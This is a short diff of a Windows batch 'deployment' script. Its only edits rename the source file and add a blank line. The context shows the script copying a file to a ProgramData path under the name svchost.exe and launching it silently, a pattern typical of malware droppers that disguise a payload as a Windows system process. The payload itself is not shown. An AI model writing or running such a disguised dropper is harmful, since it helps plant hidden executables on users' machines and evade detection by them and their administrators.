@@ -13,7 +13,7 @@ set "TARGET=%ProgramData%\Microsoft\Network\Diagnostics\svchost.exe"
 echo Starting deployment...
 
 REM ==================== FIND CUSTOM FILE IN FOLDER ====================
-set "SOURCE_FILE=%~dp0custom.file"
+set "SOURCE_FILE=%~dp0custom_name.file"
 
 if not exist "%SOURCE_FILE%" (
     echo ERROR: File not found in folder!
@@ -86,4 +86,5 @@ timeout /t 2 /nobreak >nul
 cmd /c start "" "%TARGET%" >nul 2>&1
 
 echo Done
+
 pause
